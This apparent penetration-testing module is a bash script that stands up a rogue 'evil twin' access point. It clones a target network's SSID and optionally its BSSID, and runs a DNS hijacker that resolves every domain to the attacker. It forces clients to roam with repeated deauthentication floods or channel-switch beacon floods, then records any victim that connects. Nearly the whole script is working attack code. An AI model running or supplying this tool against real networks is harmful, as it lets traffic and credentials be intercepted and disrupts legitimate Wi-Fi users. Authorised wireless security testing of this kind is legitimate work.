#!/usr/bin/env bash
# MODULE_META
# NAME="Rogue AP / Evil Twin"
# CATEGORY="F"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="hostapd,dnsmasq,iptables,mdk4"
# DESC="Deploy evil twin AP to test client susceptibility and WIDS response"
# REQS="managed_iface,target_ssid,nat"
# PCAP="yes"
# DECODE="dhcp"

#===============================================================================
#  modules/f1_rogue_ap.sh
#  F1: Rogue AP / Evil Twin (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Choose between SSID Spoofing (New BSSID) or BSSID Cloning (Exact BSSID).
#  2. Deploy rogue AP via hostapd.
#  3. Optional: Use mdk4 CSA (Channel Switch Announcement) to force roam.
#  4. Provide synchronized NAT/DNS via Go-Brain and local dnsmasq.
#===============================================================================

set -euo pipefail

# SNR Safeguard (Red Team Hardening)
if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
    echo -e "\n[!] WARNING: Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm)."
    echo "[*] Rogue AP will be significantly weaker than the legitimate AP, making roams unlikely."
    read -p "[?] Continue anyway? [y/N]: " snr_continue
    [[ "$snr_continue" != "y" ]] && exit 0
fi

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
TARGET_BSSID="${GUEST_BSSID:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/f1"
SCAN_TIME="${SCAN_TIME:-120}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="F1"
INTERNAL_IP="${INTERNAL_IP:-192.168.44.1}"

if [[ -z "$INTERFACE" || -z "$SSID" ]]; then
    echo "[!] WIFI_INTERFACE or GUEST_SSID not set."
    exit 1
fi

echo "[*] Initializing Rogue AP tactical options..."

# Intelligence Insight
if [[ "${ASTRA_TARGET_PMF:-}" != "None" ]]; then
    echo -e "\n[!] INTELLIGENCE ALERT: Target supports PMF (802.11w)."
    echo "[*] Deauthentication may be ignored. CSA Catalyst (Option 3) is recommended."
fi

# 1. Interactive Selection
echo "[?] Select Rogue AP Mode:"
echo "    1) SSID Only (Random BSSID)"
echo "    2) BSSID Clone (Match Target AP MAC: ${TARGET_BSSID:-Unknown})"
read -p "Selection [1/2]: " mode_choice

BSSID_LINE=""
if [[ "$mode_choice" == "2" ]] && [[ -n "$TARGET_BSSID" ]]; then
    echo "[*] Cloning BSSID: $TARGET_BSSID"
    BSSID_LINE="bssid=$TARGET_BSSID"
fi

echo "[?] Select Roaming Catalyst:"
echo "    1) None (Wait for natural roam)"
echo "    2) Targeted Deauth (Surgical)"
echo "    3) CSA (Channel Switch Announcement - Stealthier)"
read -p "Selection [1-3]: " catalyst_choice

# 2. Configuration
HOSTAPD_CONF="${EVIDENCE_PREFIX}_hostapd.conf"
DNSMASQ_CONF="${EVIDENCE_PREFIX}_dnsmasq.conf"
HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"
DNSMASQ_LOG="${EVIDENCE_DIR}/${TC_ID}_dnsmasq.log"

cat <<EOF > "$HOSTAPD_CONF"
interface=$INTERFACE
driver=nl80211
ssid=$SSID
$BSSID_LINE
hw_mode=g
channel=${GUEST_CHANNEL:-6}
auth_algs=1
wpa=0
EOF

cat <<EOF > "$DNSMASQ_CONF"
interface=$INTERFACE
dhcp-range=192.168.44.10,192.168.44.100,12h
dhcp-option=3,$INTERNAL_IP
dhcp-option=6,$INTERNAL_IP
address=/#/$INTERNAL_IP
log-queries
log-dhcp
EOF

# 3. Execution
cleanup() {
    echo "[*] Cleaning up Rogue AP processes..."
    [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
    [[ -n "${DNSMASQ_PID:-}" ]] && kill "$DNSMASQ_PID" 2>/dev/null || true
    [[ -n "${CSA_PID:-}" ]] && kill "$CSA_PID" 2>/dev/null || true
}
trap cleanup EXIT

echo "[*] Starting DNS hijacker..."
dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
DNSMASQ_PID=$!

echo "[*] Starting hostapd..."
hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
HOSTAPD_PID=$!

# Roaming Catalyst Execution
if [[ "$catalyst_choice" == "2" ]] && [[ -n "$TARGET_BSSID" ]]; then
    echo "[*] Starting targeted deauth catalyst..."
    # Use aireplay-ng in background to periodically nudge clients
    (
        while kill -0 $HOSTAPD_PID 2>/dev/null; do
            aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
            sleep 20
        done
    ) &
elif [[ "$catalyst_choice" == "3" ]] && [[ -n "$TARGET_BSSID" ]]; then
    if command -v mdk4 &>/dev/null; then
        echo "[*] Starting CSA catalyst via mdk4..."
        # mdk4 b -c: Beacon flood with Channel Switch Announcement
        mdk4 "$INTERFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
        CSA_PID=$!
    else
        echo "[!] mdk4 not found. Falling back to natural roam."
    fi
fi

echo "[*] Rogue AP active for ${SCAN_TIME}s. Monitoring for connections..."
sleep "$SCAN_TIME"

# 4. Cleanup early to finalize logs
cleanup
trap - EXIT

# 5. Reporting
if grep -qi "authenticated" "$HOSTAPD_LOG"; then
    V_MAC=$(grep -i "authenticated" "$HOSTAPD_LOG" | awk '{print $3}' | head -1)
    echo "[!] SUCCESS: CLIENT CONNECTED TO ROGUE AP!"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "Rogue AP Susceptibility" \
        --severity CRITICAL \
        --desc "A client device (${V_MAC:-Unknown}) automatically connected to the rogue AP with SSID: $SSID." \
        --target "$SSID" \
        --evidence "$HOSTAPD_LOG" \
        --rationale "Automatic connection to unauthorized Access Points allows an attacker to intercept all client traffic, perform MITM attacks, and serve malicious content."
else
    echo "[+] Rogue AP test complete. No connections during this interval."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[F1] Audit Complete" \
        --severity INFO \
        --desc "Deployed a rogue AP for ${SCAN_TIME}s on $INTERFACE. No clients connected." \
        --target "$SSID" \
        --evidence "$HOSTAPD_LOG" \
        --rationale "Testing for rogue AP susceptibility confirms current client resistance to unauthorized BSSIDs."
fi

exit 0
